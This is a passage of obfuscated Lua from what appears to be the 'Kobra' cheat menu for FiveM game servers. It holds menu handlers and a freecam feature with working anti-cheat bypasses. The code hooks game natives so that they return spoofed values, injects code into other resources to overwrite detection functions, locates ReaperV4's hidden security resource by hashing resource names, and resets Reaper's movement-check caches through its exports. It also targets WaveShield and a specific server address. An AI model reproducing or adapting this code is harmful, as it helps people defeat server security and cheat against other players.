((v1190.type=="slider-checkbox") and (type(v1190.value)~="nil") and (v1190.label==v186.label)) then if (v184=="Left") then v1190.value=math.max(v186.min or (0 + 0) ,v186.value-v864 );elseif (v184=="Right") then v1190.value=math.min(v186.max or (243 -143) ,v186.value + v864 );else return;end end end v863=2;end if (v863==(435 -(114 + 319))) then v183:UpdateElements(v17);if ((v186.scrollType=="onScroll") and v186.onSelect) then if (v186.type=="slider-checkbox") then v186.onSelect(v186.value,v186.checked or false );else v186.onSelect(v186.value);end end break;end end end break;end end end;v12.Enter=function(v187) if ( not v17 or ( #v17==(0 -0))) then return;end local v188=v17[v15];if  not v188 then return;end if  not v24 then return;end if (v188.type=="subMenu") then table.insert(v20,{menu=v17,categories=v18,categoryIndex=v19});table.insert(v21,v188.label or "Submenu" );if (v188.type=="Server") then v12:UpdateListMenu();end if (v188.categories and (type(v188.categories)=="table") and ( #v188.categories>(0 -0))) then v18=v188.categories;v19=1 + 0 ;v17=v18[v19].tabs or {} ;v15=1 -0 ;v187:UpdateElements(v17);return;end if (v188.subTabs and (type(v188.subTabs)=="table") and ( #v188.subTabs>0)) then v18=nil;v19=1 -0 ;v17=v188.subTabs;v15=1964 -(556 + 1407) ;v187:UpdateElements(v17);return;end return;end if ((v188.type=="button") and v188.onSelect and (type(v188.onSelect)=="function")) then local v505=1206 -(741 + 465) ;local v506;local v507;while true do if ((466 -(170 + 295))==v505) then return;end if (v505==(0 + 0)) then v506,v507=pcall(v188.onSelect);if  not v506 then v187:Debug("red","onSelect error: "   .. tostring(v507) );end v505=1 + 0 ;end end end if ((v188.type=="checkbox") or (v188.type=="scrollable-checkbox") or (v188.type=="slider-checkbox")) then if v188.locked then local v679=0;while true do if (v679==0) then v187:Notify("error","Kobra","This module has been disabled due to high detection rates!",7386 -4386 );return;end end end if (type(v188.checked)~="boolean") then v188.checked=true;else v188.checked= not v188.checked;end if (v188.onSelect and (type(v188.onSelect)=="function")) then if (v188.type=="scrollable-checkbox") then local v827=0 + 0 ;local v828;local v829;while true do if (v827==(0 + 0)) then v828,v829=pcall(v188.onSelect,v188.values[v188.value],v188.checked);if  not v828 then v187:Debug("red","scrollable-checkbox onSelect error: "   .. tostring(v829) );end break;end end elseif (v188.type=="slider-checkbox") then local v962,v963=pcall(v188.onSelect,v188.value,v188.checked);if  not v962 then v187:Debug("red","slider-checkbox onSelect error: "   .. tostring(v963) );end else local v964,v965=pcall(v188.onSelect,v188.checked);if  not v964 then v187:Debug("red","checkbox onSelect error: "   .. tostring(v965) );end end end v187:UpdateElements(v17);return;end if ((v188.type=="scrollable") or (v188.type=="scrollable-checkbox")) then local v508=0 + 0 ;while true do if (v508==(1230 -(957 + 273))) then if (v188.values and (type(v188.values)=="table") and ( #v188.values>(0 + 0))) then if v188.onSelect then v188.onSelect(v188.values[v188.value]);end end return;end end end if ((v188.type=="slider") or (v188.type=="slider-checkbox")) then if ((v188.scrollType=="onEnter") and v188.onSelect) then if (v188.type=="slider-checkbox") then v188.onSelect(v188.value,v188.checked or false );else v188.onSelect(v188.value);end end return;end end;local v64=false;v12.Backspace=function(v189) if ( #v20>(0 + 0)) then local v509=table.remove(v20);table.remove(v21);v17=v509.menu or v16 ;v18=v509.categories;v19=v509.categoryIndex or (3 -2) ;v15=2 -1 ;v189:UpdateElements(v17);else v189:HideUI();end end;v12.PrevCategory=function(v190) if ( not v18 or ( #v18==(0 -0))) then return;end v19=v19-(4 -3) ;if (v19<1) then v19= #v18;end v17=v18[v19].tabs or {} ;v15=1781 -(389 + 1391) ;v190:UpdateElements(v17);v190:SendMessage({action="keydown",index=v15-(1 + 0) });end;v12.NextCategory=function(v191) local v192=0 + 0 ;while true do if (v192==3) then v191:SendMessage({action="keydown",index=v15-(2 -1) });break;end if (v192==2) then v15=1;v191:UpdateElements(v17);v192=3;end if (v192==0) then if ( not v18 or ( #v18==(951 -(783 + 168)))) then return;end v19=v19 + (3 -2) ;v192=1 + 0 ;end if (v192==(312 -(309 + 2))) then if (v19> #v18) then v19=2 -1 ;end v17=v18[v19].tabs or {} ;v192=1214 -(1090 + 122) ;end end end;v12.ToggleFreecam=function(v193,v194,v195) if (type(v194)~="boolean") then return;end if v194 then v32=true;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=true,weaponIndex=v34,vehicleIndex=v35}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then MachoHookNative(5923634300000000000,function(...) return false, -(1 + 0);end);MachoHookNative(11673589000000000000 -65878866 ,function(...) return false,GetEntityCoords(PlayerPedId());end);MachoHookNative(14327026000000000000 -(258 + 203) ,function(...) return false,false;end);MachoHookNative(10181871000000000000 -0 ,function(...) return false,1915 -(1701 + 214) ;end);MachoHookNative(12777102000000000000,function(...) return false,false;end);MachoHookNative(1858573000000000000 -(113 + 1661) ,function(...) return false,0 + 0 ;end);MachoHookNative(15349248000000000000 -0 ,function(...) return false,0;end);MachoHookNative(18127728000000000000 -1233111898 ,function(...) return false,true;end);MachoHookNative(11059360000000000000 -(760 + 112) ,function(...) return false,true;end);_G.KobraFreecamSpeed=v195;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v1046,v1047) local v1048=_G[v1046];if ( not v1048 or (type(v1048)~="function")) then return;end _G[v1046]=function(...) return v1047(v1048,...);end;end local function v966(v1049) local v1050=0;local v1051;local v1052;local v1053;while true do if (v1050==(1696 -(556 + 1139))) then v1053=math.abs(math.cos(v1052));return vector3( -math.sin(v1051) * v1053 ,math.cos(v1051) * v1053 ,math.sin(v1052));end if (v1050==0) then v1051=math.rad(v1049.z);v1052=math.rad(v1049.x);v1050=16 -(6 + 9) ;end end end local function v967(v1054) local v1055=0 + 0 ;local v1056;while true do if (v1055==(0 + 0)) then v1056=math.rad(v1054.z);return vector3(math.cos(v1056),math.sin(v1056),0);end end end local function v968(v1057,v1058,v1059) if (v1057<v1058) then return v1058;end if (v1057>v1059) then return v1059;end return v1057;end hNative("RotationToDirection",function(v1060,...) return v1060(...);end);hNative("GetRightVector",function(v1061,...) return v1061(...);end);hNative("Clamp",function(v1062,...) return v1062(...);end);hNative("CreateThread",function(v1063,...) return v1063(...);end);hNative("Wait",function(v1064,...) return v1064(...);end);hNative("IsVehicleSeatFree",function(v1065,...) return v1065(...);end);hNative("PlayerPedId",function(v1066,...) return v1066(...);end);hNative("GetEntityCoords",function(v1067,...) return v1067(...);end);hNative("CreateCam",function(v1068,...) return v1068(...);end);hNative("DoesCamExist",function(v1069,...) return v1069(...);end);hNative("SetCamCoord",function(v1070,...) return v1070(...);end);hNative("SetCamRot",function(v1071,...) return v1071(...);end);hNative("RenderScriptCams",function(v1072,...) return v1072(...);end);hNative("DestroyCam",function(v1073,...) return v1073(...);end);hNative("SetFocusEntity",function(v1074,...) return v1074(...);end);hNative("SetTextFont",function(v1075,...) return v1075(...);end);hNative("SetTextProportional",function(v1076,...) return v1076(...);end);hNative("SetTextScale",function(v1077,...) return v1077(...);end);hNative("SetTextDropShadow",function(v1078,...) return v1078(...);end);hNative("SetTextEdge",function(v1079,...) return v1079(...);end);hNative("SetTextOutline",function(v1080,...) return v1080(...);end);hNative("SetTextCentre",function(v1081,...) return v1081(...);end);hNative("SetTextColour",function(v1082,...) return v1082(...);end);hNative("BeginTextCommandDisplayText",function(v1083,...) return v1083(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1084,...) return v1084(...);end);hNative("EndTextCommandDisplayText",function(v1085,...) return v1085(...);end);hNative("GetCamCoord",function(v1086,...) return v1086(...);end);hNative("GetCamRot",function(v1087,...) return v1087(...);end);hNative("IsControlPressed",function(v1088,...) return v1088(...);end);hNative("GetDisabledControlNormal",function(v1089,...) return v1089(...);end);hNative("TaskStandStill",function(v1090,...) return v1090(...);end);hNative("SetFocusPosAndVel",function(v1091,...) return v1091(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1092,...) return v1092(...);end);hNative("GetShapeTestResult",function(v1093,...) return v1093(...);end);hNative("IsControlJustPressed",function(v1094,...) return v1094(...);end);hNative("IsDisabledControlJustPressed",function(v1095,...) return v1095(...);end);hNative("IsEntityAVehicle",function(v1096,...) return v1096(...);end);hNative("TaskWarpPedIntoVehicle",function(v1097,...) return v1097(...);end);hNative("SetEntityCoords",function(v1098,...) return v1098(...);end);hNative("GiveWeaponToPed",function(v1099,...) return v1099(...);end);hNative("SetCurrentPedWeapon",function(v1100,...) return v1100(...);end);hNative("ShootSingleBulletBetweenCoords",function(v1101,...) return v1101(...);end);local v969=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v969.x,v969.y,v969.z + (171 -(28 + 141)) );SetCamRot(_G.KobraFreecamObject,0 + 0 ,0 -0 ,GetEntityHeading(PlayerPedId()),2);RenderScriptCams(true,false,0,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(0 + 0 );if _G.KobraFreecamObject then local v1226=GetCamCoord(_G.KobraFreecamObject);local v1227=GetCamRot(_G.KobraFreecamObject,2);local v1228=_G.KobraFreecamSpeed or (1317.25 -(486 + 831)) ;local v1229=(IsControlPressed(0 -0 ,21) and (v1228 + (3 -2))) or v1228 ;local v1230=v966(v1227);local v1231=v967(v1227);local v1232,v1233,v1234=0,0 + 0 ,0;TaskStandStill(PlayerPedId(),31 -21 );SetFocusPosAndVel(v1226.x,v1226.y,v1226.z,1263 -(668 + 595) ,0 + 0 ,0 + 0 );if IsControlPressed(0 -0 ,322 -(23 + 267) ) then local v1308=0;while true do if (v1308==(1944 -(1129 + 815))) then v1232=v1232 + (v1230.x * v1229) ;v1233=v1233 + (v1230.y * v1229) ;v1308=1;end if (v1308==(388 -(371 + 16))) then v1234=v1234 + (v1230.z * v1229) ;break;end end end if IsControlPressed(1750 -(1326 + 424) ,33) then v1232=v1232-(v1230.x * v1229) ;v1233=v1233-(v1230.y * v1229) ;v1234=v1234-(v1230.z * v1229) ;end if IsControlPressed(0 -0 ,34) then v1232=v1232-(v1231.x * v1229) ;v1233=v1233-(v1231.y * v1229) ;end if IsControlPressed(0 -0 ,153 -(88 + 30) ) then local v1309=771 -(720 + 51) ;while true do if (v1309==0) then v1232=v1232 + (v1231.x * v1229) ;v1233=v1233 + (v1231.y * v1229) ;break;end end end if IsControlPressed(0,48 -26 ) then v1234=v1234 + v1229 ;end if IsControlPressed(1776 -(421 + 1355) ,59 -23 ) then v1234=v1234-v1229 ;end SetCamCoord(_G.KobraFreecamObject,v1226.x + v1232 ,v1226.y + v1233 ,v1226.z + v1234 );local v1235=GetDisabledControlNormal(0,1 + 0 );local v1236=GetDisabledControlNormal(1083 -(286 + 797) ,7 -5 );local v1237=v968(v1227.x-(v1236 * 5) , -89,146 -57 );local v1238=v1227.z-(v1235 * 5) ;SetCamRot(_G.KobraFreecamObject,v1237,v1227.y,v1238,2);end end end);else _G.KobraFreecamEnabled=true;end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                print("hello im inside of a resource")
                    _G.KobraFreecamSpeed = ]]   .. v195   .. [[

                    if not _G.KobraFreecamThreadRunning then
                        _G.KobraFreecamEnabled = true
                        _G.KobraFreecamThreadRunning = true
                    
                        function hNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                return newFunction(originalNative, ...)
                            end
                        end

                        local function RotationToDirection(rot)
                            local z = math.rad(rot.z)
                            local x = math.rad(rot.x)
                            local num = math.abs(math.cos(x))
                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                        end

                        local function GetRightVector(rot)
                            local z = math.rad(rot.z)
                            return vector3(math.cos(z), math.sin(z), 0.0)
                        end

                        local function Clamp(val, min, max)
                            if val < min then return min end
                            if val > max then return max end
                            return val
                        end

                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                        local coords = GetEntityCoords(PlayerPedId())
                        _G.KobraFreecamObject = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                        SetCamCoord(_G.KobraFreecamObject, coords.x, coords.y, coords.z + 2.0)
                        SetCamRot(_G.KobraFreecamObject, 0.0, 0.0, GetEntityHeading(PlayerPedId()), 2)
                        RenderScriptCams(true, false, 0, true, true)
                        
                        CreateThread(function()
                            while _G.KobraFreecamThreadRunning do
                                Wait(0)

                                if _G.KobraFreecamObject then
                                    local coords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local beforeSpeed = _G.KobraFreecamSpeed or 0.25
                                    local speed = IsControlPressed(0, 21) and beforeSpeed + 1.0 or beforeSpeed
                                    local forward = RotationToDirection(rot)
                                    local right = GetRightVector(rot)
                                    local moveX, moveY, moveZ = 0, 0, 0

                                    TaskStandStill(PlayerPedId(), 10)
                                    SetFocusPosAndVel(coords.x, coords.y, coords.z, 0.0, 0.0, 0.0)

                                    if IsControlPressed(0, 32) then moveX = moveX + forward.x * speed moveY = moveY + forward.y * speed moveZ = moveZ + forward.z * speed end
                                    if IsControlPressed(0, 33) then moveX = moveX - forward.x * speed moveY = moveY - forward.y * speed moveZ = moveZ - forward.z * speed end
                                    if IsControlPressed(0, 34) then moveX = moveX - right.x * speed moveY = moveY - right.y * speed end
                                    if IsControlPressed(0, 35) then moveX = moveX + right.x * speed moveY = moveY + right.y * speed end
                                    if IsControlPressed(0, 22) then moveZ = moveZ + speed end
                                    if IsControlPressed(0, 36) then moveZ = moveZ - speed end

                                    SetCamCoord(_G.KobraFreecamObject, coords.x + moveX, coords.y + moveY, coords.z + moveZ)

                                    local x = GetDisabledControlNormal(0, 1)
                                    local y = GetDisabledControlNormal(0, 2)
                                    local newPitch = Clamp(rot.x - y * 5, -89.0, 89.0)
                                    local newYaw = rot.z - x * 5

                                    SetCamRot(_G.KobraFreecamObject, newPitch, rot.y, newYaw, 2)
                                end
                            end
                        end)
                    else
                        _G.KobraFreecamEnabled = true
                    end
                ]] );end else if  not v30 then local v830=439 -(397 + 42) ;local v831;local v832;while true do if (2==v830) then MachoInjectResource("ReaperV4",[[
                    _G["GetRenderingCam"] = function()
                        return 0
                    end

                    _G["GetDistanceBetweenCoords"] = function()
                        return 0
                    end
                ]]);Wait(250);v830=1 + 2 ;end if (v830==(803 -(24 + 776))) then if v832 then MachoInjectResource(v832,[[
                        _G["GetRenderingCam"] = function()
                            return 0
                        end

                        _G["GetDistanceBetweenCoords"] = function()
                            return 0
                        end
                    ]]);end MachoInjectResource("any",[[
                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "player_loaded", false, true)
                    if success then
                        print("Updated Cache 1 Successfully")
                    else
                        print("Failed to Update Cache 1")
                    end

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "LastFailedMovementChecks", 0, true)
                    if success then
                        print("Updated Cache 2 Successfully")
                    else
                        print("Failed to Update 2 Cache")
                    end

                    Wait(500)

                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "NetworkIsInSpectatorMode", true, true)
                    if success then
                        print("Updated Cache 3 Successfully")
                    else
                        print("Failed to Update Cache 3")
                    end
                ]]);v830=4;end if ((0 -0)==v830) then print("[^5Kobra^7]: [^3DEBUG^7] >> Loading ReaperV4 Freecam Bypass");v831=nil;v830=786 -(222 + 563) ;end if (v830==(1 -0)) then function v831() local v1121=0 + 0 ;local v1122;local v1123;local v1124;local v1125;local v1126;local v1127;local v1128;local v1129;while true do if (v1121==1) then v1124=GetConvar("reaper_security_resource","");v1125=tonumber(v1124);if  not v1125 then return;end v1121=192 -(23 + 167) ;end if (v1121==(1798 -(690 + 1108))) then v1122=false;v1123=nil;function v1123(v1310,v1311) v1311=v1311 or "072b0945-fdd6d8bb-2e1d0476-d15c8f4b-ed6db3e1" ;v1310=v1310   .. v1311 ;local v1312=1942 + 3439 ;for v1340=1 + 0 , #v1310 do local v1341=string.byte(v1310,v1340);v1312=(v1312 * (881 -(40 + 808)))~v1341 ;end return v1312;end v1121=1 + 0 ;end if ((15 -11)==v1121) then for v1313,v1314 in ipairs(v1127) do v1128=v1128 + 1 + 0 ;if (v1123(v1314)==v1125) then print("^7[^5Kobra^7]: [^3DEBUG^7]: Reaper Security Resource Found: "   .. v1314 );v1129=v1314;break;end local v1315=v1314:gsub("[-_]","");if ((v1315~=v1314) and (v1123(v1315)==v1125)) then v1129=v1315;break;end if ((v1128%50)==(0 + 0)) then Wait(0 + 0 );end end if v1129 then return v1129;end break;end if (v1121==2) then v1126=GetNumResources() or (571 -(47 + 524)) ;v1127={};for v1316=0 + 0 ,v1126-(2 -1)  do local v1317=0;local v1318;while true do if ((0 -0)==v1317) then v1318=GetResourceByFindIndex(v1316);if (v1318 and (v1318~="")) then table.insert(v1127,v1318);end break;end end end v1121=3;end if (v1121==3) then if ( #v1127==(0 -0)) then return;end v1128=0;v1129=nil;v1121=1730 -(1165 + 561) ;end end end v832=v831();v830=2;end if ((1 + 3)==v830) then print("[^5Kobra^7]: [^2DEBUG^7] >> Loaded ReaperV4 Freecam Bypass");v30=true;break;end end end _G.KobraFreecamSpeed=v195;if  not _G.KobraFreecamThreadRunning then _G.KobraFreecamEnabled=true;_G.KobraFreecamThreadRunning=true;function hNative(v865,v866) local v867=0 -0 ;local v868;while true do if (v867==(0 + 0)) then v868=_G[v865];if ( not v868 or (type(v868)~="function")) then return;end v867=480 -(341 + 138) ;end if (v867==(1 + 0)) then _G[v865]=function(...) return v866(v868,...);end;break;end end end local function v833(v869) local v870=math.rad(v869.z);local v871=math.rad(v869.x);local v872=math.abs(math.cos(v871));return vector3( -math.sin(v870) * v872 ,math.cos(v870) * v872 ,math.sin(v871));end local function v834(v873) local v874=math.rad(v873.z);return vector3(math.cos(v874),math.sin(v874),0);end local function v835(v875,v876,v877) if (v875<v876) then return v876;end if (v875>v877) then return v877;end return v875;end hNative("RotationToDirection",function(v878,...) return v878(...);end);hNative("GetRightVector",function(v879,...) return v879(...);end);hNative("Clamp",function(v880,...) return v880(...);end);hNative("CreateThread",function(v881,...) return v881(...);end);hNative("Wait",function(v882,...) return v882(...);end);hNative("IsVehicleSeatFree",function(v883,...) return v883(...);end);hNative("PlayerPedId",function(v884,...) return v884(...);end);hNative("GetEntityCoords",function(v885,...) return v885(...);end);hNative("CreateCam",function(v886,...) return v886(...);end);hNative("DoesCamExist",function(v887,...) return v887(...);end);hNative("SetCamCoord",function(v888,...) return v888(...);end);hNative("SetCamRot",function(v889,...) return v889(...);end);hNative("RenderScriptCams",function(v890,...) return v890(...);end);hNative("DestroyCam",function(v891,...) return v891(...);end);hNative("SetFocusEntity",function(v892,...) return v892(...);end);hNative("SetTextFont",function(v893,...) return v893(...);end);hNative("SetTextProportional",function(v894,...) return v894(...);end);hNative("SetTextScale",function(v895,...) return v895(...);end);hNative("SetTextDropShadow",function(v896,...) return v896(...);end);hNative("SetTextEdge",function(v897,...) return v897(...);end);hNative("SetTextOutline",function(v898,...) return v898(...);end);hNative("SetTextCentre",function(v899,...) return v899(...);end);hNative("SetTextColour",function(v900,...) return v900(...);end);hNative("BeginTextCommandDisplayText",function(v901,...) return v901(...);end);hNative("AddTextComponentSubstringPlayerName",function(v902,...) return v902(...);end);hNative("EndTextCommandDisplayText",function(v903,...) return v903(...);end);hNative("GetCamCoord",function(v904,...) return v904(...);end);hNative("GetCamRot",function(v905,...) return v905(...);end);hNative("IsControlPressed",function(v906,...) return v906(...);end);hNative("GetDisabledControlNormal",function(v907,...) return v907(...);end);hNative("TaskStandStill",function(v908,...) return v908(...);end);hNative("SetFocusPosAndVel",function(v909,...) return v909(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v910,...) return v910(...);end);hNative("GetShapeTestResult",function(v911,...) return v911(...);end);hNative("IsControlJustPressed",function(v912,...) return v912(...);end);hNative("IsDisabledControlJustPressed",function(v913,...) return v913(...);end);hNative("IsEntityAVehicle",function(v914,...) return v914(...);end);hNative("TaskWarpPedIntoVehicle",function(v915,...) return v915(...);end);hNative("SetEntityCoords",function(v916,...) return v916(...);end);hNative("GiveWeaponToPed",function(v917,...) return v917(...);end);hNative("SetCurrentPedWeapon",function(v918,...) return v918(...);end);hNative("ShootSingleBulletBetweenCoords",function(v919,...) return v919(...);end);local v836=GetEntityCoords(PlayerPedId());_G.KobraFreecamObject=CreateCam("DEFAULT_SCRIPTED_CAMERA",true);SetCamCoord(_G.KobraFreecamObject,v836.x,v836.y,v836.z + (3 -1) );SetCamRot(_G.KobraFreecamObject,326 -(89 + 237) ,0 -0 ,GetEntityHeading(PlayerPedId()),3 -1 );RenderScriptCams(true,false,881 -(581 + 300) ,true,true);CreateThread(function() while _G.KobraFreecamThreadRunning do Wait(1220 -(855 + 365) );if (_G.KobraFreecamEnabled and _G.KobraFreecamObject) then local v1130=GetCamCoord(_G.KobraFreecamObject);local v1131=GetCamRot(_G.KobraFreecamObject,4 -2 );local v1132=_G.KobraFreecamSpeed or 0.25 ;local v1133=(IsControlPressed(0 + 0 ,21) and (v1132 + 1)) or v1132 ;local v1134=v833(v1131);local v1135=v834(v1131);local v1136,v1137,v1138=1235 -(1030 + 205) ,0 + 0 ,0 + 0 ;TaskStandStill(PlayerPedId(),10);SetFocusPosAndVel(v1130.x,v1130.y,v1130.z,0,286 -(156 + 130) ,0 -0 );if IsControlPressed(0,53 -21 ) then local v1239=0 -0 ;while true do if (v1239==(1 + 0)) then v1138=v1138 + (v1134.z * v1133) ;break;end if (v1239==(0 + 0)) then v1136=v1136 + (v1134.x * v1133) ;v1137=v1137 + (v1134.y * v1133) ;v1239=70 -(10 + 59) ;end end end if IsControlPressed(0 + 0 ,162 -129 ) then local v1240=1163 -(671 + 492) ;while true do if (v1240==0) then v1136=v1136-(v1134.x * v1133) ;v1137=v1137-(v1134.y * v1133) ;v1240=1 + 0 ;end if (v1240==(1216 -(369 + 846))) then v1138=v1138-(v1134.z * v1133) ;break;end end end if IsControlPressed(0,10 + 24 ) then local v1241=0;while true do if (v1241==(0 + 0)) then v1136=v1136-(v1135.x * v1133) ;v1137=v1137-(v1135.y * v1133) ;break;end end end if IsControlPressed(0,35) then local v1242=0;while true do if (v1242==(1945 -(1036 + 909))) then v1136=v1136 + (v1135.x * v1133) ;v1137=v1137 + (v1135.y * v1133) ;break;end end end if IsControlPressed(0 + 0 ,22) then v1138=v1138 + v1133 ;end if IsControlPressed(0 -0 ,239 -(11 + 192) ) then v1138=v1138-v1133 ;end SetCamCoord(_G.KobraFreecamObject,v1130.x + v1136 ,v1130.y + v1137 ,v1130.z + v1138 );local v1139=GetDisabledControlNormal(0 + 0 ,176 -(135 + 40) );local v1140=GetDisabledControlNormal(0 -0 ,2 + 0 );local v1141=v835(v1131.x-(v1140 * (10 -5)) , -(132 -43),89);local v1142=v1131.z-(v1139 * 5) ;SetCamRot(_G.KobraFreecamObject,v1141,v1131.y,v1142,178 -(50 + 126) );end end end);else _G.KobraFreecamEnabled=true;end end else v32=false;MachoSendDuiMessage(v14,json.encode({action="displayFreecam",visible=false}));if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then local v837=0;while true do if ((24 -15)==v837) then hNative("TaskWarpPedIntoVehicle",function(v1143,...) return v1143(...);end);hNative("SetEntityCoords",function(v1144,...) return v1144(...);end);hNative("GiveWeaponToPed",function(v1145,...) return v1145(...);end);hNative("SetCurrentPedWeapon",function(v1146,...) return v1146(...);end);v837=10;end if (v837==(1 + 3)) then hNative("SetTextScale",function(v1147,...) return v1147(...);end);hNative("SetTextDropShadow",function(v1148,...) return v1148(...);end);hNative("SetTextEdge",function(v1149,...) return v1149(...);end);hNative("SetTextOutline",function(v1150,...) return v1150(...);end);v837=5;end if (v837==(1415 -(1233 + 180))) then hNative("CreateCam",function(v1151,...) return v1151(...);end);hNative("SetCamCoord",function(v1152,...) return v1152(...);end);hNative("SetCamRot",function(v1153,...) return v1153(...);end);hNative("RenderScriptCams",function(v1154,...) return v1154(...);end);v837=3;end if ((975 -(522 + 447))==v837) then hNative("EndTextCommandDisplayText",function(v1155,...) return v1155(...);end);hNative("GetCamCoord",function(v1156,...) return v1156(...);end);hNative("GetCamRot",function(v1157,...) return v1157(...);end);hNative("IsControlPressed",function(v1158,...) return v1158(...);end);v837=7;end if (v837==(1426 -(107 + 1314))) then hNative("SetTextCentre",function(v1159,...) return v1159(...);end);hNative("SetTextColour",function(v1160,...) return v1160(...);end);hNative("BeginTextCommandDisplayText",function(v1161,...) return v1161(...);end);hNative("AddTextComponentSubstringPlayerName",function(v1162,...) return v1162(...);end);v837=3 + 3 ;end if ((0 -0)==v837) then _G.KobraFreecamEnabled=false;_G.KobraFreecamThreadRunning=false;function hNative(v1163,v1164) local v1165=_G[v1163];if ( not v1165 or (type(v1165)~="function")) then return;end _G[v1163]=function(...) return v1164(v1165,...);end;end hNative("CreateThread",function(v1166,...) return v1166(...);end);v837=1;end if (v837==(2 + 1)) then hNative("DestroyCam",function(v1167,...) return v1167(...);end);hNative("SetFocusEntity",function(v1168,...) return v1168(...);end);hNative("SetTextFont",function(v1169,...) return v1169(...);end);hNative("SetTextProportional",function(v1170,...) return v1170(...);end);v837=7 -3 ;end if ((39 -29)==v837) then hNative("ShootSingleBulletBetweenCoords",function(v1171,...) return v1171(...);end);RenderScriptCams(false,false,1910 -(716 + 1194) ,true,true);if _G.KobraFreecamObject then local v1191=0 + 0 ;while true do if (v1191==0) then DestroyCam(_G.KobraFreecamObject,false);_G.KobraFreecamObject=nil;break;end end end SetFocusEntity(PlayerPedId());break;end if (v837==(1 + 7)) then hNative("GetShapeTestResult",function(v1172,...) return v1172(...);end);hNative("IsControlJustPressed",function(v1173,...) return v1173(...);end);hNative("IsDisabledControlJustPressed",function(v1174,...) return v1174(...);end);hNative("IsEntityAVehicle",function(v1175,...) return v1175(...);end);v837=9;end if (7==v837) then hNative("GetDisabledControlNormal",function(v1176,...) return v1176(...);end);hNative("TaskStandStill",function(v1177,...) return v1177(...);end);hNative("SetFocusPosAndVel",function(v1178,...) return v1178(...);end);hNative("StartExpensiveSynchronousShapeTestLosProbe",function(v1179,...) return v1179(...);end);v837=511 -(74 + 429) ;end if (v837==(1 -0)) then hNative("Wait",function(v1180,...) return v1180(...);end);hNative("IsVehicleSeatFree",function(v1181,...) return v1181(...);end);hNative("PlayerPedId",function(v1182,...) return v1182(...);end);hNative("GetEntityCoords",function(v1183,...) return v1183(...);end);v837=2;end end else v48(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
